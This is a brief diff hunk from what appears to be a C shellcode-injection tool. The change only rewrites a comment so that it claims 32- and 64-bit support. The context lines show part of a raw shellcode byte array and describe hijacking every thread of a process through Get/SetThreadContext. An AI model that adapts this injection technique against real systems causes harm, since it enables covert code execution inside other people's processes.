@@ -200,7 +200,7 @@ char reigsterpreserving_shellcode[] = "\x60\x9c\x33\xc9\x64\x8b\x49\x30\x8b\x49\
 
 /**
 * Injects shellcode into every thread of a process using Get/SetThreadContext.
-*
+* Supports 32- and 64 Bit applications.
 */
 int main(int argc, char* argv[])
 {
